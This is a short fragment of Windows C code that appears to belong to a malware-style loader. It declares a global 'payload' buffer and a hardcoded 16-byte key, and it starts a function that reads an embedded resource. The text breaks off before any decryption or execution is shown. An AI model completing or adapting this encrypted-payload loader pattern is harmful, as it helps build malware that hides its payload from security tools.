...
// Global variables for payload loaded from resource
unsigned char* payload = NULL;
unsigned int payload_len = 0;
unsigned char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };

// Function to load payload from resource
BOOL LoadPayloadFromResource(HMODULE hModule) {
	HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
	if (!hResource) return FALSE;
	
	HGLOBAL hLoadedResource = LoadResource(hModule, hResource);
	if (!hLoadedResource) return FALSE;
	
	payload = (unsigned char*)LockResource(hLoadedResource);
